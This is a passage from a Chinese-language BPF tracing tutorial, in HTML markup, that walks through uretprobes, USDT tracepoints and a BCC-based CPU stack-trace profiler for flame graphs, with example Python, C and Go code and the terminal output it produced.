class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>接着查看<code>uprobes.py</code>程序的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1977813 [000] d..31 841378.451282: bpf_trace_printk: New hello-bpf process running with PID: 1977813'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977821 [000] d..31 841383.099817: bpf_trace_printk: New hello-bpf process running with PID: 1977821'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977829 [000] d..31 841384.195796: bpf_trace_printk: New hello-bpf process running with PID: 1977829'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977833 [000] d..31 841384.907406: bpf_trace_printk: New hello-bpf process running with PID: 1977833'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1977836 [000] d..31 841385.280290: bpf_trace_printk: New hello-bpf process running with PID: 1977836'</span><br></pre></td></tr></table></figure><h4 id="Uretprobes"><a href="#Uretprobes" class="headerlink" title="Uretprobes"></a>Uretprobes</h4><p><code>Uretprobes</code>是<code>kretprobes</code>的并行探针，但用于用户空间程序。它们将BPF程序附着到返回值的指令上，并让你通过访问BPF代码中的寄存器来访问这些返回值。</p><p>结合<code>uprobes</code>和<code>uretprobes</code>可以让你编写更复杂的BPF程序。 它们可以让你更全面地了解系统中运行的应用程序。当你可以在函数运行之前和完成后立即注入跟踪代码时，可以开始收集更多数据并测量应用程序行为。一个常见的用例是测量一个函数执行需要多长时间，而无需更改应用程序中的一行代码。</p><p><code>uretprobes.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">BPF_HASH(cache, u64, u64);</span></span><br><span class="line"><span class="string">int trace_start_time(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 start_time_ns = bpf_ktime_get_ns();</span></span><br><span class="line"><span class="string">  cache.update(&amp;pid, &amp;start_time_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int print_duration(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  u64 *start_time_ns = cache.lookup(&amp;pid);</span></span><br><span class="line"><span class="string">  if (start_time_ns == 0) &#123;</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  u64 duration_ns = bpf_ktime_get_ns() - *start_time_ns;</span></span><br><span class="line"><span class="string">  bpf_trace_printk("Function call duration: %d\\n", duration_ns);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text = bpf_source)</span><br><span class="line">bpf.attach_uprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"trace_start_time"</span>)</span><br><span class="line">bpf.attach_uretprobe(name = <span class="string">"./hello-bpf"</span>, sym = <span class="string">"main.main"</span>, fn_name = <span class="string">"print_duration"</span>)</span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>首先执行<code>hello-bpf</code>程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br><span class="line">[root@VM-16-14-centos cpt3]# ./hello-bpf </span><br><span class="line">Hello, BPF</span><br></pre></td></tr></table></figure><p>接着查看<code>uprobes.py</code>程序的输出</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# python3 uprobes.py </span><br><span class="line">b'       hello-bpf-1980788 [000] d..31 842673.650139: bpf_trace_printk: Function call duration: 73230'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980801 [000] d..31 842677.296529: bpf_trace_printk: Function call duration: 307682'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980810 [000] d..31 842678.797365: bpf_trace_printk: Function call duration: 85177'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980814 [000] d..31 842680.214506: bpf_trace_printk: Function call duration: 330715'</span><br><span class="line">b''</span><br><span class="line">b'       hello-bpf-1980818 [000] d..31 842681.247549: bpf_trace_printk: Function call duration: 70589'</span><br></pre></td></tr></table></figure><h4 id="User-Statically-Defined-Tracepoints"><a href="#User-Statically-Defined-Tracepoints" class="headerlink" title="User Statically Defined Tracepoints"></a>User Statically Defined Tracepoints</h4><p>用户静态定义的跟踪点(USDT)为用户空间中的应用程序提供静态跟踪点。这是一种检测应用程序的便捷方式，因为它们提供了BPF提供的跟踪功能的低开销入口点。你还可以将它们用作在生产中跟踪应用程序的约定，而不管这些应用程序是使用何种编程语言编写的。</p><p>USDT由DTrace推广，DTrace最初由Sun Microsystems开发，用于Unix系统的动态检测。 由于许可问题，DTrace直到最近才在Linux中可用；但是，Linux内核开发人员从DTrace的原始工作中获得了很多灵感来实现USDT。</p><p>就像之前看到的静态内核跟踪点一样，USDT要求开发人员使用指令来检测他们的代码，内核将使用这些指令作为陷阱来执行BPF程序。 USDT的<code>Hello World</code>版本只有几行代码：</p><p><code>hello_usdt.c</code>程序如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sdt.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">DTRACE_PROBE(<span class="string">"hello-usdt"</span>, <span class="string">"probe-main"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个例子中，我们使用Linux提供的宏来定义我们的第一个USDT。<code>DTRACE_PROBE</code>将注册内核将用于注入BPF函数回调的跟踪点。该宏中的第一个参数是报告跟踪的程序。第二个是我们报告跟踪的名称。</p><p>安装在系统中的许多应用程序都可能使用这种类型的探针，以便以一种可预测的方式访问运行时跟踪数据。例如，数据库MySQL使用静态定义的跟踪点公开各种信息。你可以从服务器中执行的查询以及许多其他用户操作中收集信息。<code>Node.js</code>是构建在<code>Chrome V8</code>引擎上的JavaScript运行时，同样提供了可用于提取运行时信息的跟踪点。</p><p>在展示如何将BPF程序附着到用户定义的跟踪点之前，我们需要先谈谈可发现性。因为这些跟踪点是在可执行文件中以二进制格式定义的，所以我们需要一种方法来列出程序定义的探针，而无需深入研究源代码。提取此信息的一种方法是直接读取ELF二进制文件。首先，我们将编译我们之前的Hello World USDT示例； 我们可以为此使用 GCC：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -o hello_usdt hello_usdt.c</span><br></pre></td></tr></table></figure><p>编译报错如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">hello_usdt.c:1:10: fatal error: sys/sdt.h: No such file or directory</span><br><span class="line"><span class="meta"> #</span><span class="bash">include &lt;sys/sdt.h&gt;</span></span><br><span class="line">          ^~~~~~~~~~~</span><br><span class="line">compilation terminated.</span><br></pre></td></tr></table></figure><p>报错解决如下</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# yum install systemtap-sdt-devel</span><br></pre></td></tr></table></figure><p>上述<code>gcc</code>命令将生成一个名为<code>hello_usdt</code>的二进制文件，我们可以使用该文件开始使用多个工具来发现它定义的跟踪点。 Linux提供了一个名为<code>readelf</code>的实用程序来显示有关ELF文件的信息。 你可以将它与我们编译的示例一起使用，<code>readelf</code>可以提供有关二进制文件的大量信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# readelf -n ./hello_usdt</span><br><span class="line">Displaying notes found in: .note.stapsdt</span><br><span class="line">  Owner                 Data sizeDescription</span><br><span class="line">  stapsdt              0x00000033NT_STAPSDT (SystemTap probe descriptors)</span><br><span class="line">    Provider: "hello-usdt"</span><br><span class="line">    Name: "probe-main"</span><br></pre></td></tr></table></figure><p>发现二进制文件中定义的跟踪点的更好选择是使用BCC的<code>tplist</code>工具，该工具可以显示内核跟踪点和USDT。这个工具的优点是它的输出简单；仅显示跟踪点定义，而没有关于可执行文件的任何其他信息。用法类似于<code>readelf</code>：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@VM-16-14-centos cpt3]# /usr/share/bcc/tools/tplist -l ./hello_usdt</span><br><span class="line">b'./hello_usdt' b'"hello-usdt"':b'"probe-main"'</span><br></pre></td></tr></table></figure><p>它列出了你在单独的行中定义的每个跟踪点。在我们的示例中，它仅显示一行带有我们的<code>probe-main</code>定义：</p><p>在你知道二进制文件中支持的跟踪点之后，你可以将BPF程序附着到它们上，就像你在前面的例子中看到的那样：</p><p><code>usdt.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, USDT</span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">int trace_binary_exec(struct pt_regs *ctx) &#123;</span></span><br><span class="line"><span class="string">  u64 pid = bpf_get_current_pid_tgid();</span></span><br><span class="line"><span class="string">  bpf_trace_printk("New hello_usdt process running with PID: %d\\n", pid);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">usdt = USDT(path = <span class="string">"./hello_usdt"</span>)<span class="number">1</span></span><br><span class="line">usdt.enable_probe(probe = <span class="string">"probe-main"</span>, fn_name = <span class="string">"trace_binary_exec"</span>)<span class="number">2</span></span><br><span class="line">bpf = BPF(text = bpf_source, usdt_contexts = [usdt])<span class="number">3</span></span><br><span class="line">bpf.trace_print()</span><br></pre></td></tr></table></figure><p>1：创建一个USDT对象； USDT不是BPF的一部分，因为你可以在无需与BPF虚拟机交互的情况下使用它们。因为它们彼此独立，所以它们的使用独立于BPF代码。</p><p>2：附着BPF函数以跟踪程序执行到我们应用程序中的探针</p><p>3：使用刚刚创建的跟踪点定义初始化BPF环境。 这将通知BCC需要生成代码来连接我们的BPF程序和二进制文件中的探针定义。当它们都连接时，我们可以打印BPF程序生成的跟踪，以发现二进制示例中最新的执行。</p><h3 id="可视化跟踪数据"><a href="#可视化跟踪数据" class="headerlink" title="可视化跟踪数据"></a>可视化跟踪数据</h3><p>到目前为止，我们已经展示了在调试输出中打印数据的示例。这在生产环境中不是很有用。 没有人喜欢理解冗长而复杂的日志。如果我们想监控延迟和CPU利用率的变化，通过查看一段时间内的图表比汇总文件流中的数字更容易。</p><p>本节探讨呈现BPF跟踪数据的不同方式。一方面，我们将展示BPF程序如何构建聚合信息。另一方面，你将学习如何以便携式表示形式导出该信息，并使用现成的工具访问更丰富的表示形式并与其他人分享。</p><h4 id="火焰图"><a href="#火焰图" class="headerlink" title="火焰图"></a>火焰图</h4><p>火焰图是帮助你可视化系统花费时间的图表。它们可以让你清楚地表示应用程序中的哪些代码执行得更频繁。火焰图的创建者<code>Brendan Gregg</code>维护了一组脚本，可以在GitHub上轻松生成这些可视化格式。我们使用这些脚本从本节后面使用BPF收集的数据生成火焰图。 </p><p>关于火焰图显示的内容，需要记住两件重要的事情：</p><ul><li>x轴按字母顺序排列。每个堆栈的宽度表示它在收集数据中出现的频率，这可以与启用探查器时访问该代码路径的频率相关。</li><li>y 轴显示在分析器读取堆栈跟踪时排序，保留跟踪层次结构。</li></ul><p>最著名的火焰图代表了系统中最频繁消耗CPU的代码；这些被称为CPU图。另一个有趣的火焰图可视化是CPU外图；它们代表CPU在与应用程序无关的其他任务上花费的时间。通过组合<code>on-CPU</code>和<code>off-CPU</code>图表，可以全面了解系统花费CPU周期的内容。</p><p>CPU内和CPU外图都使用堆栈跟踪来指示系统花费时间的位置。 一些编程语言，如Go，总是在其二进制文件中包含跟踪信息，但其他编程语言，如 C++ 和Java，需要一些额外的工作才能使堆栈跟踪可读。在你的应用程序包含堆栈跟踪信息后，BPF程序可以使用它来聚合内核看到的最常见的代码路径。</p><p>内核中的堆栈跟踪聚合有优点也有缺点。一方面，这是一种计算堆栈跟踪频率的有效方法，因为它发生在内核中，避免将每个堆栈信息发送到用户空间并减少内核和用户空间之间的数据交换。另一方面，非CPU图表要处理的事件数量可能会非常高，因为你正在跟踪应用程序上下文切换期间发生的每个事件。如果尝试对其进行分析太长时间，这可能会在系统中产生大量开销。 使用火焰图时请记住这一点。</p><p>BCC提供了几个实用程序来帮助聚合和可视化堆栈跟踪，主要的是宏<code>BPF_STACK_TRACE</code>。 这个宏生成一个<code>BPF_MAP_TYPE_STACK_TRACE</code>类型的BPF映射来存储BPF程序累积的堆栈。最重要的是，这个BPF映射得到了增强，增加了从程序上下文中提取堆栈信息的方法，并在聚合它们后在你想使用它们时遍历累积的堆栈跟踪。</p><p>在下一个示例中，我们构建了一个简单的BPF分析器，它打印从用户空间应用程序收集的堆栈跟踪。我们使用分析器收集的轨迹生成CPU上的火焰图。为了测试这个分析器，我们将编写一个生成CPU负载的最小Go程序。<code>main.go</code>程序代码如下所示</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">"time"</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123; </span><br><span class="line">  j:=<span class="number">3</span></span><br><span class="line"><span class="keyword">for</span> time.Since(time.Now()) &lt; time.Second &#123; </span><br><span class="line">    <span class="keyword">for</span> i:=<span class="number">1</span>;i&lt;<span class="number">1000000</span>;i++&#123;</span><br><span class="line">j*=i </span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果将此代码保存在名为<code>main.go</code>的文件中并使用<code>go run main.go</code>运行它您会看到系统的CPU利用率显着增加。 你可以通过按键盘上的<code>Ctrl-C</code>来停止执行，CPU利用率将恢复正常。</p><p>我们BPF程序的第一部分将初始化分析器结构：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;1</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);2</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);3</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：初始化一个结构，该结构将存储我们的分析器接收到的每个堆栈帧的引用标识符。 稍后我们使用这些标识符来找出当时正在执行的代码路径。</p><p>2：初始化一个BPF哈希映射，我们用它来聚合我们看到相同strack帧的频率。 火焰图脚本使用此聚合值来确定执行相同代码的频率。</p><p>3：初始化我们的BPF堆栈跟踪映射。 我们为此地图设置了最大尺寸，但它可能会根据要处理的数据量而有所不同。将这个值作为变量会更好，但我们知道写的Go应用程序不是很大，所以10000个元素就足够了。</p><p>接下来，我们在分析器中实现聚合堆栈跟踪的函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;1</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;2</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);3</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><p>1：验证当前BPF上下文中程序的进程ID是不是我们的Go应用程序的进程ID；否则，我们将忽略该事件。我们目前还没有定义<code>PROGRAM_PID</code>的值。在初始化BPF程序之前，让我们在分析器的Python部分替换这个字符串。这是BCC初始化BPF程序方式的当前限制；我们不能从用户空间传递任何变量，并且作为一种常见的做法，这些字符串在初始化之前在代码中被替换。</p><p>2：创建跟踪以汇总其使用情况。我们使用内置函数<code>get_stackid</code>从程序上下文中获取堆栈ID。 这是BCC添加到我们的堆栈跟踪映射的辅助函数之一。我们使用标志<code>BPF_F_USER_STACK</code>来表示我们想要获取用户空间应用程序的堆栈ID，我们并不关心内核内部发生了什么。</p><p>3：增加跟踪的计数器以跟踪相同代码的执行频率。</p><p>接下来，我们要将堆栈跟踪收集器附加到内核中的所有<code>Perf</code>事件：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])<span class="number">1</span></span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))<span class="number">2</span></span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,<span class="number">3</span></span><br><span class="line">                      ev_config=PerfSWConfig.CPU_CLOCK,</span><br><span class="line">                      fn_name=<span class="string">'collect_stack_traces'</span>,</span><br><span class="line">                      sample_period=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">exiting = <span class="number">0</span></span><br></pre></td></tr></table></figure><p>1：Python程序的第一个参数是我们正在分析的Go应用程序的进程标识符。</p><p>2：使用Python的内置替换函数将BPF源中的字符串<code>PROGRAM_ID</code>与提供给分析器的参数交换。</p><p>3：将BPF程序附加到所有软件<code>Perf</code>事件，这将忽略任何其他事件，如硬件事件。我们还将BPF程序配置为使用CPU时钟作为时间源，这样我们就可以测量执行时间。</p><p>最后，我们需要实现在分析器中断时将堆栈跟踪转储到标准输出中的代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    sleep(<span class="number">300</span>)</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    exiting = <span class="number">1</span></span><br><span class="line">    signal.signal(signal.SIGINT, signal_ignore)</span><br><span class="line"></span><br><span class="line">print(<span class="string">"dumping the results"</span>)</span><br><span class="line"><span class="keyword">for</span> trace, acc <span class="keyword">in</span> sorted(bpf[<span class="string">'cache'</span>].items(), key=<span class="keyword">lambda</span> cache: cache[<span class="number">1</span>].value):<span class="number">1</span></span><br><span class="line">    line = []</span><br><span class="line">    <span class="keyword">if</span> trace.stack_id &lt; <span class="number">0</span> <span class="keyword">and</span> trace.stack_id == -errno.EFAULT:<span class="number">2</span></span><br><span class="line">        line = [<span class="string">'Unknown stack'</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        stack_trace = list(bpf[<span class="string">'traces'</span>].walk(trace.stack_id))</span><br><span class="line">        <span class="keyword">for</span> stack_address <span class="keyword">in</span> reversed(stack_trace):<span class="number">3</span></span><br><span class="line">            function_name = bpf.sym(stack_address, program_pid).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">            <span class="keyword">if</span> function_name == <span class="string">'[unknown]'</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            line.extend([function_name])<span class="number">4</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(line) &lt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    frame = <span class="string">";"</span>.join(line)<span class="number">5</span></span><br><span class="line">    sys.stdout.write(<span class="string">"%s %d\n"</span> % (frame, acc.value))</span><br><span class="line">    <span class="keyword">if</span> exiting:</span><br><span class="line">        exit()</span><br></pre></td></tr></table></figure><p>1：遍历我们收集的所有跟踪，以便我们可以按顺序打印它们。</p><p>2：验证我们是否获得了堆栈标识符，我们可以稍后将其与特定的代码行相关联。如果我们得到一个无效值，我们将在火焰图中使用一个占位符。</p><p>3：以相反的顺序遍历堆栈跟踪中的所有条目。我们这样做是希望在顶部看到最近执行的第一个代码路径，就像在任何堆栈跟踪中所期望的那样。</p><p>4：使用BCC帮助程序符号将堆栈帧的内存地址转换为我们源代码中的函数名称。</p><p>5：格式化以分号分隔的堆栈跟踪行。这是火焰图脚本希望能够生成我们的可视化的格式。</p><p>完整的<code>profiler.py</code>程序如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> errno</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bcc <span class="keyword">import</span> BPF, PerfSWConfig, PerfType</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">signal_ignore</span><span class="params">(signal, frame)</span>:</span></span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bpf_source = <span class="string">"""</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/ptrace.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;uapi/linux/bpf_perf_event.h&gt;</span></span><br><span class="line"><span class="string">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"><span class="string">struct trace_t &#123;</span></span><br><span class="line"><span class="string">  int stack_id;</span></span><br><span class="line"><span class="string">&#125;;</span></span><br><span class="line"><span class="string">BPF_HASH(cache, struct trace_t);</span></span><br><span class="line"><span class="string">BPF_STACK_TRACE(traces, 10000);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">bpf_source += <span class="string">"""</span></span><br><span class="line"><span class="string">int collect_stack_traces(struct bpf_perf_event_data *ctx) &#123;</span></span><br><span class="line"><span class="string">  u32 pid = bpf_get_current_pid_tgid() &gt;&gt; 32;</span></span><br><span class="line"><span class="string">  if (pid != PROGRAM_PID)</span></span><br><span class="line"><span class="string">    return 0;</span></span><br><span class="line"><span class="string">  struct trace_t trace = &#123;</span></span><br><span class="line"><span class="string">    .stack_id = traces.get_stackid(&amp;ctx-&gt;regs, BPF_F_USER_STACK)</span></span><br><span class="line"><span class="string">  &#125;;</span></span><br><span class="line"><span class="string">  cache.increment(trace);</span></span><br><span class="line"><span class="string">  return 0;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line">program_pid = int(sys.argv[<span class="number">1</span>])</span><br><span class="line">bpf_source = bpf_source.replace(<span class="string">'PROGRAM_PID'</span>, str(program_pid))</span><br><span class="line"></span><br><span class="line">bpf = BPF(text=bpf_source)</span><br><span class="line">bpf.attach_perf_event(ev_type=PerfType.SOFTWARE,</span><br><span class="line">                      